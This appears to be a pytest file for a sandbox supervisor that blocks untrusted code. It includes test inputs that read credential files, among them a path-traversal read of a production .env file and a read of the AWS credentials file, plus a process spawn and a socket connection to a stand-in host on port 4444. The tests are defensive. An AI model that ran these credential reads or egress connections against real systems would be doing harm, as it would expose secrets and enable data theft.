import pytest
from pathlib import Path
from app.storage import TelemetryStore
from app.ebpf_bridge import RealEBPFBridge
from app.supervisor import SandboxSupervisor
from app.models import WorkerExecutionRequest


@pytest.fixture
def supervisor(tmp_path):
    db_file = tmp_path / "test_telemetry.db"
    store = TelemetryStore(db_path=db_file)
    ebpf = RealEBPFBridge(store)
    return SandboxSupervisor(store, ebpf)


def test_benign_workspace_read_allowed(supervisor):
    ws = str(supervisor.workspace_dir.resolve())
    code = f'with open(r"{ws}/q3_threat_intel.md", "r") as f:\n    RESULT = f.read()'
    res = supervisor.execute_in_sandbox(WorkerExecutionRequest(code_snippet=code))
    assert res["status"] == "SUCCESS"
    assert "Q3 Threat Intel Summary" in res["output"]
    assert any(r["verdict"] == "ALLOW" for r in res["audit_records"])


def test_path_traversal_escape_blocked_synchronously(supervisor):
    ws = str(supervisor.workspace_dir.resolve())
    code = f'with open(r"{ws}/../host_secrets/prod_db_credentials.env", "r") as f:\n    RESULT = f.read()'
    res = supervisor.execute_in_sandbox(WorkerExecutionRequest(code_snippet=code))
    assert res["status"] == "BLOCKED_EPERM"
    assert "super_secret_rds_master_key_9912" not in res["output"]
    assert any(r["verdict"] == "BLOCK_EPERM" for r in res["audit_records"])


def test_credential_theft_blocked_before_open(supervisor):
    code = 'with open("/home/admin/.aws/credentials", "r") as f:\n    RESULT = f.read()'
    res = supervisor.execute_in_sandbox(WorkerExecutionRequest(code_snippet=code))
    assert res["status"] == "BLOCKED_EPERM"
    assert any(r["reason"].startswith("CREDENTIAL_GUARD") for r in res["audit_records"])


def test_subprocess_rce_blocked(supervisor):
    code = 'p = subprocess.Popen(["whoami"], stdout=subprocess.PIPE)\nRESULT = "spawned"'
    res = supervisor.execute_in_sandbox(WorkerExecutionRequest(code_snippet=code))
    assert res["status"] == "BLOCKED_EPERM"
    assert any(r["reason"] == "UNAUTHORIZED_PROCESS_SPAWN" for r in res["audit_records"])


def test_socket_exfiltration_blocked(supervisor):
    code = 's = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(("198.51.100.99", 4444))'
    res = supervisor.execute_in_sandbox(WorkerExecutionRequest(code_snippet=code))
    assert res["status"] == "BLOCKED_EPERM"
    assert any(r["reason"] == "UNAUTHORIZED_SOCKET_EGRESS" for r in res["audit_records"])
